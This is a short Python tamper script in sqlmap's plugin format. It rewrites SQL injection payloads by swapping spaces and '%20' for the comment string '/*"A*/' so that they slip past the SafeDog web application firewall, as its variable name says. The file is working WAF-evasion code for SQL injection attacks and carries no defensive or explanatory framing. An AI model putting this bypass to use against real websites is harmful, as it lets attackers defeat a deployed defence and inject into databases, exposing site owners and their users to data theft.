#!/usr/bin/env python

from lib.core.enums import PRIORITY
from lib.core.settings import UNICODE_ENCODING
import time

__priority__ = PRIORITY.LOWEST

def dependencies():
	pass

def tamper(payload, **kwargs):

	if payload:
		bypass_SafeDog_str = '/*"A*/'
		payload=payload.replace('%20',bypass_SafeDog_str)
		payload=payload.replace(' ',bypass_SafeDog_str)
		# time.sleep(1)

	return payload